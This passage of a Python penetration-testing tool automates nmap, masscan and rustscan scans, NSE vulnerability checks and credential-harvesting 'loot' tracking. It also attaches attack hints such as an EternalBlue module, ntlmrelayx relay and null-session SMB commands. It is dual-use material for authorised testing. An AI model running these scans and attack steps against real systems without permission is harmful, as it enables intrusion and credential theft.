    'katana', 'hakrawler', 'gospider', 'gau', 'waybackurls', 'arjun',
    'httpx', 'subfinder', 'feroxbuster',
    # injection / SSRF
    'dalfox', 'commix', 'ssrfmap', 'interactsh-client',
    # auth / cred / Windows-AD
    'kerbrute', 'netexec', 'nxc', 'bloodhound-python',
    'GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetNPUsers.py', 'impacket-GetNPUsers',
    'nmblookup',
    # password cracking (hash identification is built-in; these run the actual crack)
    'hashcat', 'john', 'certipy', 'certipy-ad',
]

def check_tools():
    return {t: shutil.which(t) for t in TOOL_LIST}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NMAP RUNNER & XML PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERBOSE_STREAM = os.environ.get('SMARTNMAP_STREAM', '1') != '0'


def _stream_process(cmd, txt_file, timeout, quiet=False, prefix='    '):
    """Run a subprocess streaming stdout/stderr live to the terminal and to file.
    Returns (returncode, combined_output)."""
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, universal_newlines=True,
        )
    except FileNotFoundError:
        error(f"{cmd[0]} not found on PATH")
        return 127, ''
    start = time.time()
    output_lines = []

    def reader():
        try:
            for line in proc.stdout:
                output_lines.append(line)
                if not quiet:
                    sys.stdout.write(f"{C.Di}{prefix}{line}{C.Re}")
                    sys.stdout.flush()
        except Exception:
            pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    rc = None
    try:
        while True:
            if proc.poll() is not None:
                rc = proc.returncode
                break
            if time.time() - start > timeout:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                rc = 124
                warn(f"{cmd[0]} timed out after {timeout}s")
                break
            time.sleep(0.2)
    except KeyboardInterrupt:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        rc = 130
        warn("Scan interrupted by user")
    t.join(timeout=2)
    out = ''.join(output_lines)
    try:
        Path(txt_file).write_text(out)
    except Exception:
        pass
    return rc if rc is not None else 0, out


def run_nmap(args, xml_file, label='', timeout=600, stream=None):
    """Run nmap, save XML + text output. Streams output live by default.
    Returns (returncode, stdout)."""
    cmd = ['nmap', '-oX', str(xml_file)] + args
    info(f"Running: {C.Di}{' '.join(cmd)}{C.Re}")
    stream_live = VERBOSE_STREAM if stream is None else stream
    txt_file = xml_file.with_suffix('.txt')
    try:
        if stream_live:
            rc, out = _stream_process(cmd, txt_file, timeout, quiet=False)
            return rc, out
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        txt_file.write_text(result.stdout + result.stderr)
        if result.returncode != 0 and result.stderr:
            for line in result.stderr.strip().split('\n'):
                if 'warning' not in line.lower() and line.strip():
                    warn(f"nmap: {line.strip()}")
        return result.returncode, result.stdout
    except subprocess.TimeoutExpired:
        error(f"Nmap timed out ({timeout}s) for: {label}")
        return 1, ""
    except FileNotFoundError:
        error("nmap not found! Install with: apt install nmap")
        sys.exit(1)


def run_masscan(target, outdir, rate=10000, ports='1-65535', timeout=300):
    """Use masscan for ultra-fast port discovery. Returns sorted list of open TCP ports."""
    if not shutil.which('masscan'):
        return None
    out_file = outdir / 'masscan.json'
    cmd = ['masscan', target, '-p', ports, '--rate', str(rate),
           '-oJ', str(out_file), '--wait', '1']
    info(f"masscan {target} -p{ports} rate={rate}")
    rc, out = _stream_process(cmd, outdir / 'masscan.txt', timeout,
                              quiet=True, prefix='  [masscan] ')
    ports_found = set()
    if out_file.exists():
        try:
            raw = out_file.read_text().strip()
            if raw and raw != '[]':
                # masscan JSON is an array
                try:
                    data = json.loads(raw.rstrip(','))
                except json.JSONDecodeError:
                    data = json.loads('[' + raw.rstrip(',') + ']')
                for e in (data or []):
                    for port_entry in e.get('ports', []):
                        p = port_entry.get('port')
                        if p:
                            ports_found.add(int(p))
        except Exception as e:
            warn(f"masscan parse issue: {e}")
    return sorted(ports_found)


def run_rustscan(target, outdir, ports='1-65535', timeout=120, ulimit=5000):
    """Use rustscan for fast TCP port discovery. Returns list of open ports."""
    if not shutil.which('rustscan'):
        return None
    out_file = outdir / 'rustscan.txt'
    cmd = ['rustscan', '-a', target, '-b', '2500', '-t', '2000',
           '-u', str(ulimit), '--range', ports, '--greppable', '--no-config']
    info(f"rustscan {target} {ports}")
    rc, out = _stream_process(cmd, out_file, timeout,
                              quiet=True, prefix='  [rustscan] ')
    ports_found = set()
    for line in out.splitlines():
        line = line.strip()
        if not line or ':' not in line or line.startswith('['):
            continue
        # format: <ip> -> [port,port,port]
        if '->' in line and '[' in line:
            m = re.search(r'\[([0-9,]+)\]', line)
            if m:
                for p in m.group(1).split(','):
                    if p.strip().isdigit():
                        ports_found.add(int(p.strip()))
    return sorted(ports_found)


def tcp_connect_probe(target, ports, timeout=1.5, workers=200):
    """Python-native fast TCP connect scan as ultimate fallback. Returns open ports."""
    open_ports = []

    def probe(p):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                res = s.connect_ex((target, p))
                if res == 0:
                    return p
        except Exception:
            return None
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        for res in ex.map(probe, ports):
            if res:
                open_ports.append(res)
    return sorted(open_ports)


def resolve_target(target):
    """Resolve hostname->IP. Returns tuple (ip, hostname) or (target, None)."""
    try:
        ipaddress.ip_address(target)
        return target, None
    except ValueError:
        pass
    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except Exception:
        return target, None


def is_valid_target(target):
    """Validate target: IP, CIDR, or hostname."""
    if not target:
        return False
    try:
        ipaddress.ip_network(target, strict=False)
        return True
    except ValueError:
        return bool(re.match(r'^(?:[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)*[A-Za-z]{2,}$', target))


def check_host_alive(target, ports=(80, 443, 22, 445, 3389, 8080), timeout=1.5):
    """Quick TCP-probe test if host is alive on common ports (for -Pn scan decision)."""
    for p in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                if s.connect_ex((target, p)) == 0:
                    return True
        except Exception:
            pass
    return False

def parse_xml(xml_file):
    """Parse nmap XML, return structured dict."""
    if not xml_file.exists():
        return {'hosts': [], 'ports': [], 'services': {}, 'os': [], 'scripts': {}, 'alive_hosts': []}
    result = {'hosts': [], 'ports': [], 'services': {}, 'os': [], 'scripts': {}, 'alive_hosts': []}
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        for host in root.findall('host'):
            addr_el = host.find('address')
            addr = addr_el.get('addr', '') if addr_el is not None else ''
            status_el = host.find('status')
            if status_el is not None and status_el.get('state') == 'up':
                if addr and addr not in result['alive_hosts']:
                    result['alive_hosts'].append(addr)
                if addr and addr not in result['hosts']:
                    result['hosts'].append(addr)
            ports_el = host.find('ports')
            if ports_el is not None:
                for p in ports_el.findall('port'):
                    state = p.find('state')
                    if state is None or state.get('state') != 'open':
                        continue
                    port_num = int(p.get('portid', 0))
                    svc_el = p.find('service')
                    svc = {
                        'port': port_num, 'proto': p.get('protocol', 'tcp'),
                        'service': svc_el.get('name', '') if svc_el is not None else '',
                        'product': svc_el.get('product', '') if svc_el is not None else '',
                        'version': svc_el.get('version', '') if svc_el is not None else '',
                        'extra': svc_el.get('extrainfo', '') if svc_el is not None else '',
                        'tunnel': svc_el.get('tunnel', '') if svc_el is not None else '',
                        'scripts': {},
                    }
                    for sc in p.findall('script'):
                        svc['scripts'][sc.get('id', '')] = sc.get('output', '')
                    result['ports'].append(port_num)
                    result['services'][port_num] = svc
            os_el = host.find('os')
            if os_el is not None:
                for m in os_el.findall('osmatch'):
                    result['os'].append({'name': m.get('name', ''), 'accuracy': m.get('accuracy', '')})
            hs = host.find('hostscript')
            if hs is not None:
                for sc in hs.findall('script'):
                    result['scripts'][sc.get('id', '')] = sc.get('output', '')
    except ET.ParseError as e:
        warn(f"XML parse error: {e}")
    return result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSION VULNERABILITY CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_vulns(services):
    """Cross-reference services against known vulns. Returns list of findings."""
    findings = []
    for port, svc in services.items():
        product = svc.get('product', '').lower()
        version = svc.get('version', '').lower()
        service = svc.get('service', '').lower()
        full = f"{product} {version}".strip()
        for prod_re, ver_re, desc, cve, exploit in VULN_DB:
            if re.search(prod_re, product, re.I) or re.search(prod_re, service, re.I):
                if not ver_re or re.search(ver_re, version, re.I):
                    findings.append({
                        'port': port, 'service': svc.get('service'),
                        'product': svc.get('product'), 'version': svc.get('version'),
                        'desc': desc, 'cve': cve, 'exploit': exploit,
                    })
    return findings

def check_config_vulns(services, host_scripts):
    """Check for dangerous configuration issues from host script outputs."""
    findings = []
    all_script_text = ' '.join(host_scripts.values())
    # Also check per-port scripts
    for port, svc in services.items():
        for sid, sout in svc.get('scripts', {}).items():
            all_script_text += ' ' + sout

    if re.search(r'NT LM 0\.12', all_script_text) or re.search(r'(?i)SMBv1', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': 'v1',
            'desc': 'SMBv1 enabled (dangerous, enables EternalBlue/WannaCry)', 'cve': 'MS17-010',
            'exploit': 'Metasploit: exploit/windows/smb/ms17_010_eternalblue',
        })
    if re.search(r'(?i)message.signing.*disabled', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB message signing disabled (enables relay attacks)', 'cve': '',
            'exploit': 'Tool: ntlmrelayx.py -t smb://TARGET',
        })
    if re.search(r'(?i)signing enabled but not required', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB signing not required (enables relay attacks)', 'cve': '',
            'exploit': 'Tool: ntlmrelayx.py -t smb://TARGET',
        })
    if re.search(r'(?i)account_used:\s*guest', all_script_text):
        findings.append({
            'port': 445, 'service': 'microsoft-ds', 'product': 'SMB', 'version': '',
            'desc': 'SMB guest authentication allowed (null session possible)', 'cve': '',
            'exploit': 'smbclient -L //TARGET -N && smbmap -H TARGET',
        })
    return findings

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SCRIPT SELECTION LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_scripts_for(svc):
    """Get appropriate NSE scripts for a service. Returns (existing, missing) lists."""
    scripts = set()
    service = svc.get('service', '').lower()
    product = svc.get('product', '').lower()
    port = svc.get('port', 0)
    tunnel = svc.get('tunnel', '')

    # WinRM / Microsoft HTTPAPI — minimal HTTP scripts only
    if 'httpapi' in product:
        scripts.update(['http-title', 'http-server-header', 'http-methods', 'http-ntlm-info'])
        existing = filter_existing_scripts(scripts)
        missing = [s for s in scripts if not nse_exists(s)]
        return existing, missing

    # Service name lookup
    if service in SERVICE_SCRIPTS:
        scripts.update(SERVICE_SCRIPTS[service])

    # HTTP variants
    if any(x in service for x in ['http', 'www', 'web']):
        scripts.update(SERVICE_SCRIPTS.get('http', []))
    if tunnel == 'ssl' or any(x in service for x in ['https', 'ssl', 'tls']):
        scripts.update(SERVICE_SCRIPTS.get('ssl', []))
        scripts.update(SERVICE_SCRIPTS.get('http', []))
    if 'smb' in service or 'netbios' in service or 'samba' in product:
        scripts.update(SERVICE_SCRIPTS.get('netbios-ssn', []))
    if 'nfs' in service or service in ['rpcbind', 'mountd', 'nfs_acl']:
        scripts.update(SERVICE_SCRIPTS.get('rpcbind', []))

    # Port fallback
    if not scripts and port in PORT_SCRIPTS:
        svc_key = PORT_SCRIPTS[port]
        scripts.update(SERVICE_SCRIPTS.get(svc_key, []))

    # SSL for common HTTPS ports
    if port in [443, 8443, 9443] and not tunnel:
        scripts.update(SERVICE_SCRIPTS.get('ssl', []))

    # Product-specific extras
    for prod_key, extra_scripts in PRODUCT_SCRIPTS.items():
        if prod_key in product:
            scripts.update(extra_scripts)

    existing = filter_existing_scripts(scripts)
    missing = [s for s in scripts if not nse_exists(s)]
    return existing, missing

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOOT TRACKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class LootTracker:
    def __init__(self):
        self.creds = []
        self.keys = []
        self.flags = []
        self.shares = []
        self.urls = []
        self.files = []
        self.notes = []
        self.recommend = []       # ready-to-run commands for gated/manual follow-up
        self.usernames = []       # harvested usernames/emails -> seed brute lists
        self.auth_findings = []   # broken-auth / session / cookie / JWT findings
        self.valid_creds = []     # verified working credentials (dicts)
        self.candidate_creds = [] # found-but-unverified credentials (dicts)
        self.chain = []           # ordered kill-chain narrative steps

    def add(self, category, item):
        bucket = getattr(self, category, self.notes)
        if item not in bucket:
            bucket.append(item)

    # ── Credential state machine (feeds the reuse sweep + AD collection) ──
    def add_cred(self, user, pw=None, nthash=None, source='', scope='unknown', verified=False):
        """Store a structured credential. verified=True => usable for reuse/collection."""
        rec = {'user': user, 'pw': pw, 'nthash': nthash, 'source': source,
               'scope': scope, 'verified': verified, 'used': False}
        bucket = self.valid_creds if verified else self.candidate_creds
        key = (user, pw, nthash)
        if not any((c['user'], c['pw'], c['nthash']) == key for c in bucket):
            bucket.append(rec)
        disp = f"{user}:{pw}" if pw else (f"{user}#{nthash}" if nthash else user)
        self.add('creds', f"{disp} [{scope}] ({source})")
        return rec

    def get_unused_creds(self, verified_only=False):
        src = self.valid_creds + ([] if verified_only else self.candidate_creds)
        return [c for c in src if not c.get('used')]

    def mark_used(self, cred):
        cred['used'] = True

    def add_step(self, text):
        """Append an ordered step to the kill-chain narrative."""
        if text not in self.chain:
            self.chain.append(text)

    def scan_output(self, text):
        """Scan text output for interesting patterns."""
        patterns = {
            'creds': [
                r'(?i)(password|passwd|pwd|credentials?)\s*[:=]\s*(\S+)',
                r'(?i)(username|user|login)\s*[:=]\s*(\S+)',
                r'(?i)anonymous\s+(ftp|login|access)',
                r'(?i)account_used:\s*guest',
                r'(?i)Anonymous\s+access\s+allowed',
            ],
            'keys': [
                r'(?i)(id_rsa|id_dsa|id_ecdsa|\.pem|private.key)',
                r'BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY',
            ],
            'flags': [
                r'(?i)(user\.txt|root\.txt|flag\.txt|local\.txt|proof\.txt)',
                r'(?i)flag\{[^}]+\}',
                r'(?i)ctf\{[^}]+\}',
                r'(?i)HTB\{[^}]+\}',
                r'(?i)THM\{[^}]+\}',
            ],
            'shares': [
                r'(?i)\\\\[\w.]+\\(\w+)',
                r'(?i)/var\b|/home\b|/tmp\b|/opt\b|/srv\b',
                r'(?i)(READ|WRITE)\s+(OK|ACCESS)',
                r'(?i)Disk\s+\S+',
            ],
            'notes': [
                r'(?i)message.signing.*disabled',
                r'(?i)signing enabled but not required',
                r'NT LM 0\.12.*dangerous',
                r'(?i)SMBv1.*dangerous',
                r'(?i)VULNERABLE',
                r'(?i)authentication_level:\s*\w+',
            ],
        }
        for cat, pats in patterns.items():
            for pat in pats:
                for m in re.finditer(pat, text):
                    self.add(cat, m.group(0).strip())

    def write(self, outfile):
        """Write loot report."""
        lines = ["# Loot Report\n"]
        for cat in ['creds', 'usernames', 'keys', 'auth_findings', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']:
            items = getattr(self, cat)
            if items:
                lines.append(f"\n## {cat.upper()}")
                for item in sorted(set(items)):
                    lines.append(f"- {item}")
        Path(outfile).write_text('\n'.join(lines))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE IMPLEMENTATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def phase1_ports(target, outdir, args, api_key=None):
    """Phase 1: Port Discovery.

    Strategy:
      1. If --ports given, skip discovery.
      2. If --fast and masscan/rustscan available, use them for full-range discovery.
      3. Otherwise, nmap scan.
    Always cross-verifies masscan/rustscan findings with nmap -sV in phase 2.
    """
    section("PHASE 1: Port Discovery")
    ports = set()
    udp_ports = []

    port_range = '1-65535' if args.full else '1-10000'
    xml = outdir / 'phase1_tcp.xml'
    fast_used = False

    # Try fast scanners first if enabled
    if args.full or args.fast:
        if shutil.which('rustscan'):
            info("Using rustscan for fast TCP discovery")
            rs_ports = run_rustscan(target, outdir, ports=port_range, timeout=180)
            if rs_ports is not None:
                ports.update(rs_ports)
                fast_used = True
                good(f"rustscan: {len(rs_ports)} port(s) open")
        elif shutil.which('masscan'):
            info("Using masscan for fast TCP discovery")
            ms_ports = run_masscan(target, outdir, rate=10000, ports=port_range, timeout=180)
            if ms_ports is not None:
                ports.update(ms_ports)
                fast_used = True
                good(f"masscan: {len(ms_ports)} port(s) open")

    # Fall back to nmap (also verifies fast scanner results with precise port list)
    if not ports:
        if args.full and not args.quick:
            info(f"Nmap full TCP scan (-p{port_range})")
            nmap_args = ['-p-', '--min-rate', '5000', f'-{args.timing}',
                         '--open', '-n', '-Pn', target]
        elif args.top_ports:
            info(f"Scanning top {args.top_ports} ports")
            nmap_args = ['--top-ports', str(args.top_ports), f'-{args.timing}',
                         '--open', '-n', '-Pn', target]
        else:
            info("Quick scan (top 1000 ports)")
            nmap_args = [f'-{args.timing}', '--open', '-n', '-Pn', target]
        run_nmap(nmap_args, xml, 'Phase 1 TCP', timeout=900)
        parsed = parse_xml(xml)
        ports.update(parsed.get('ports', []))

    ports = sorted(ports)

    # Retry logic: if no ports, try with different technique
    if not ports and not args.no_retry:
        warn("Initial discovery returned 0 ports - retrying with SYN/connect fallback")
        fb_ports = tcp_connect_probe(target,
                                     ports=[21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
                                            161, 389, 443, 445, 465, 512, 513, 514, 587, 631,
                                            636, 873, 902, 993, 995, 1025, 1080, 1099, 1433,
                                            1521, 1723, 1883, 2049, 2121, 2181, 2375, 2376,
                                            3000, 3128, 3268, 3306, 3389, 4444, 4505, 4506,
                                            5000, 5432, 5601, 5672, 5900, 5984, 5985, 5986,
                                            6379, 6443, 6667, 7000, 7001, 7077, 7199, 7474,
                                            8000, 8008, 8009, 8080, 8081, 8086, 8089, 8090,
                                            8091, 8100, 8161, 8180, 8181, 8222, 8443, 8500,
                                            8834, 8888, 9000, 9001, 9042, 9080, 9090, 9092,
                                            9100, 9200, 9300, 9389, 9418, 9443, 9990, 9999,
                                            10000, 10443, 11211, 15672, 27017, 27018, 28017,
                                            50000, 50070, 50075, 61616],
                                     timeout=2.0, workers=150)
        if fb_ports:
            good(f"Python TCP-connect fallback found: {fb_ports}")
            ports = fb_ports

    # Optional UDP scan
    if args.udp:
        subsection("UDP Port Discovery")
        info("Scanning top 50 UDP ports (this may take a while)")
        udp_xml = outdir / 'phase1_udp.xml'
        run_nmap(['-sU', '--top-ports', '50', '--min-rate', '1000',
                  f'-{args.timing}', '--open', '-n', '-Pn',
                  '--defeat-icmp-ratelimit', '--max-retries', '2', target],
                 udp_xml, 'Phase 1 UDP', timeout=420)
        udp_parsed = parse_xml(udp_xml)
        udp_ports = udp_parsed.get('ports', [])
        if udp_ports:
            good(f"UDP open|open|filtered ports: {', '.join(map(str, sorted(udp_ports)))}")
            subsection("UDP Service Detection")
            udp_svc_xml = outdir / 'phase1_udp_svc.xml'
            port_list = ','.join(map(str, sorted(udp_ports)))
            run_nmap(['-sU', '-sV', '-sC', '-p', port_list,
                      '--version-intensity', '5', '-n', '-Pn',
                      '--script-timeout', '60s', f'-{args.timing}', target],
                     udp_svc_xml, 'Phase 1 UDP Services', timeout=420)

    if ports:
        good(f"Found {C.Bo}{len(ports)}{C.Re} open TCP port(s): {C.G}{', '.join(map(str, ports))}{C.Re}")
    else:
        error("No open ports discovered!")
        warn("Possible reasons: host firewalled, wrong target, WAF/IDS blocking,")
        warn("VPN not connected, or host offline. Try --udp or verify connectivity.")
        return []

    # AI advice after phase 1
    if api_key:
        ctx = f"Target: {target}\nOpen TCP ports: {ports}"
        if args.udp and udp_ports:
            ctx += f"\nOpen UDP ports: {udp_ports}"
        advice = ai_phase_advisor(api_key, "Port Discovery", ctx,
            "Which ports are most interesting for a CTF/pentest? Any unusual high ports? "
            "Should I run additional UDP scans? What services do you expect on these ports?")
        if advice:
            print(f"\n{C.M}  AI Port Analysis:{C.Re}")
            for line in advice.strip().split('\n'):
                print(f"  {C.Di}{line}{C.Re}")

    return ports


def phase2_services(target, ports, outdir, args, api_key=None):
    """Phase 2: Service Detection."""
    if not ports:
        return {}
    section("PHASE 2: Service & Version Detection")
    port_str = ','.join(map(str, ports))
    info(f"Scanning {len(ports)} ports: {port_str}")

    xml = outdir / 'phase2_services.xml'
    run_nmap(['-p', port_str, '-sV', '-sC', '-A',
              '--script-timeout', '45s', '--host-timeout', '240s',
              '--max-retries', '2',
              f'-{args.timing}', '-Pn', target],
             xml, 'Phase 2 Services', timeout=300)
    parsed = parse_xml(xml)
    services = parsed.get('services', {})
    os_info = parsed.get('os', [])

    if services:
        good(f"Identified {len(services)} service(s):")
        for port in sorted(services.keys()):
            svc = services[port]
            ver = f"{svc.get('product','')} {svc.get('version','')}".strip()
            tunnel = f" [{svc['tunnel']}]" if svc.get('tunnel') else ''
            print(f"    {C.G}{port}/{svc['proto']:<5}{C.Re} {C.Y}{svc['service']:<18}{C.Re} {ver}{tunnel}")

    # Check known vulns
    vulns = check_vulns(services)
    if vulns:
        print(f"\n  {C.R}{C.Bo}POTENTIALLY VULNERABLE VERSIONS DETECTED:{C.Re}")
        for v in vulns:
            print(f"    {C.R}Port {v['port']}: {v['product']} {v['version']}{C.Re}")
            print(f"    {C.R}  => {v['desc']} ({v['cve']}){C.Re}")
            print(f"    {C.Y}  Exploit: {v['exploit']}{C.Re}")

    if os_info:
        subsection("OS Detection")
        for o in os_info[:3]:
            info(f"{o['name']} ({o['accuracy']}% confidence)")

    # AI advice after phase 2
    if api_key:
        svc_lines = []
        for p in sorted(services.keys()):
            s = services[p]
            svc_lines.append(f"  Port {p}: {s['service']} - {s.get('product','')} {s.get('version','')}")
        vuln_lines = [f"  {v['desc']} on port {v['port']}" for v in vulns]
        ctx = f"Target: {target}\nServices:\n" + '\n'.join(svc_lines)
        if vulns:
            ctx += f"\nKnown Vulnerabilities:\n" + '\n'.join(vuln_lines)
        if os_info:
            ctx += f"\nOS: {os_info[0]['name']}"
        advice = ai_phase_advisor(api_key, "Service Detection",
            ctx,
            "Prioritize these services for deep scanning. Which versions are known vulnerable? What specific NSE scripts or tools should I focus on first? Any quick wins?")
        if advice:
            print(f"\n{C.M}  AI Service Analysis:{C.Re}")
            for line in advice.strip().split('\n'):
                print(f"  {C.Di}{line}{C.Re}")

    return services


def phase3_scripts(target, services, outdir, args, api_key=None, loot=None):
    """Phase 3: Targeted NSE Script Scanning."""
    if not services:
        return {}
    section("PHASE 3: Targeted NSE Script Scanning")

    # Group services by type for efficient scanning
    groups = {}  # label -> (ports, scripts)
    unknown_services = []

    for port, svc in services.items():
        existing, missing = get_scripts_for(svc)
        if not existing and not missing:
            unknown_services.append((port, svc))
            continue

        service = svc.get('service', '').lower()
        if 'ftp' in service: label = 'FTP'
        elif 'ssh' in service: label = 'SSH'
        elif any(x in service for x in ['http', 'www']): label = 'HTTP'
        elif any(x in service for x in ['smb', 'netbios', 'microsoft-ds']): label = 'SMB'
        elif any(x in service for x in ['nfs', 'rpcbind', 'mountd', 'nlockmgr', 'nfs_acl', 'msrpc', 'epmap']): label = 'RPC'
        elif 'mysql' in service: label = 'MySQL'
        elif 'ms-sql' in service: label = 'MSSQL'
        elif 'smtp' in service: label = 'SMTP'
        elif 'dns' in service or 'domain' in service: label = 'DNS'
        elif 'snmp' in service: label = 'SNMP'
        elif 'ldap' in service: label = 'LDAP'
        elif 'rdp' in service or 'ms-wbt' in service: label = 'RDP'
        elif 'vnc' in service: label = 'VNC'
        elif 'irc' in service: label = 'IRC'
        elif 'redis' in service: label = 'Redis'
        elif 'mongo' in service: label = 'MongoDB'
        elif 'pop3' in service: label = 'POP3'
        elif 'imap' in service: label = 'IMAP'
        elif 'kerberos' in service: label = 'Kerberos'
        elif 'winrm' in service: label = 'WinRM'
        else: label = 'Other'

        if label not in groups:
            groups[label] = {'ports': [], 'scripts': set()}
        groups[label]['ports'].append(str(port))
        groups[label]['scripts'].update(existing)
        if missing:
            warn(f"  Port {port}: {len(missing)} scripts not installed: {', '.join(missing[:5])}")

    all_results = {}

    for label, grp in groups.items():
        scripts = filter_existing_scripts(grp['scripts'])
        if not scripts:
            continue
        subsection(f"{label} Scripts ({', '.join(grp['ports'])})")
        port_str = ','.join(grp['ports'])
        script_str = ','.join(scripts)
        xml = outdir / f"phase3_{label.lower().replace('/', '_')}.xml"

        nmap_args = ['-p', port_str, f'--script={script_str}',
                     '--script-timeout', '60s', '--host-timeout', '300s',
                     '-Pn', target]
        # Add -sV for vulners-type scripts
        if any('vuln' in s for s in scripts):
            nmap_args.insert(2, '-sV')

        run_nmap(nmap_args, xml, f'Phase 3 {label}', timeout=360)
        parsed = parse_xml(xml)
        for p, s in parsed.get('services', {}).items():
            if s.get('scripts'):
                all_results[p] = s
                # Track loot from per-port scripts
                if loot:
                    for sid, sout in s['scripts'].items():
                        loot.scan_output(sout)
                        # Print notable findings
                        if any(x in sid for x in ['anon', 'showmount', 'enum-shares', 'enum-users',
                                                    'backdoor', 'vuln', 'empty-password']):
                            good(f"  {C.Bo}{sid}{C.Re}: {sout[:200]}")
        # Track loot from host-level scripts (SMB signing, guest auth, etc.)
        if loot:
            for sid, sout in parsed.get('scripts', {}).items():
                loot.scan_output(sout)

    # Handle unknown services with AI (deduplicate by service+product+version)
    if unknown_services and api_key:
        subsection("AI: Unknown Service Analysis")
        seen_combos = {}
        for port, svc in unknown_services:
            combo = (svc.get('service',''), svc.get('product',''), svc.get('version',''))
            if combo not in seen_combos:
                advice = ai_github_nse_search(api_key, *combo)
                seen_combos[combo] = advice
            else:
                advice = seen_combos[combo]
            if advice:
                ai_msg(f"Port {port} ({svc.get('service','unknown')}):")
                for line in advice.strip().split('\n')[:10]:
                    print(f"    {C.Di}{line}{C.Re}")

    # AI advice on script results
    if api_key and all_results:
        script_summary = []
        for p, s in all_results.items():
            for sid, sout in s.get('scripts', {}).items():
                if sout.strip():
                    script_summary.append(f"Port {p} [{sid}]: {sout[:200]}")
        if script_summary:
            advice = ai_phase_advisor(api_key, "Targeted Scripts",
                f"Target: {target}\nScript findings:\n" + '\n'.join(script_summary[:30]),
                "What are the most significant findings? Any credentials, writable shares, anonymous access, or exploitable misconfigurations? What should I investigate next?")
            if advice:
                print(f"\n{C.M}  AI Script Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return all_results


def phase4_vuln(target, ports, outdir, args, api_key=None, loot=None):
    """Phase 4: Vulnerability Scanning. Returns list of structured vuln findings."""
    if not ports:
        return []
    section("PHASE 4: Vulnerability Scanning")
    port_str = ','.join(map(str, ports))
    findings = []

    # Standard vuln scripts
    subsection("Nmap Vuln Category Scan")
    xml = outdir / 'phase4_vuln.xml'
    if args.bb:
        info("BB mode: excluding DoS/intrusive scripts from vuln scan")
        script_arg = 'vuln and not (dos or *slowloris* or *smb-flood* or *nessus*)'
    else:
        script_arg = 'vuln'
    run_nmap(['-p', port_str, '--script', script_arg,
              '--script-timeout', '90s', '--host-timeout', '400s',
              '-Pn', f'-{args.timing}', target],
             xml, 'Phase 4 Vuln', timeout=420)
    parsed = parse_xml(xml)

    def _is_real_vuln(sout):
        """Return True if NSE output confirms vulnerability (not false/error/access-denied)."""
        if not sout or not sout.strip():
            return False
        up = sout.upper()
        if 'VULNERABLE' in up and 'NOT VULNERABLE' not in up:
            return True
        # exclude noise
        lower_stripped = sout.strip().lower()
        if lower_stripped in ('false', 'error'):
            return False
        if 'error: script execution failed' in lower_stripped:
            return False
        if 'nt_status_access_denied' in lower_stripped:
            return False
        return False

    # Process per-port scripts
    for p, svc in parsed.get('services', {}).items():
        for sid, sout in svc.get('scripts', {}).items():
            if _is_real_vuln(sout):
                print(f"  {C.R}{C.Bo}[VULN]{C.Re} Port {p} - {sid}:")
                for line in sout.strip().split('\n')[:5]:
                    print(f"    {C.R}{line}{C.Re}")
                cve = extract_cve(sout)
                findings.append({
                    'port': p, 'service': svc.get('service', ''),
                    'product': svc.get('product', ''), 'version': svc.get('version', ''),
                    'desc': nse_vuln_desc(sid, sout), 'cve': cve,
                    'exploit': nse_exploit_hint(sid, cve),
                })
                if loot:
                    loot.add('notes', f"VULN on port {p}: {sid}")

    # Process host-level scripts (MS08-067, MS17-010 etc.)
    host_scripts = parsed.get('scripts', {})
    for sid, sout in host_scripts.items():
        if _is_real_vuln(sout):
